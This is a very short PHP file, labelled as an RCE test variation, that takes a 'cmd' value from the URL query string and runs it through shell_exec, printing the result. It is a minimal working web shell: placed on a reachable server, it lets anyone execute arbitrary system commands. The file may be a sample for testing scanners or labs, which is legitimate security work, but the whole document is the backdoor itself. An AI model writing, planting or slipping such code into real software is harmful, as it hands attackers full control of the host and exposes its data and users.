<?php
// RCE test variation #218
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>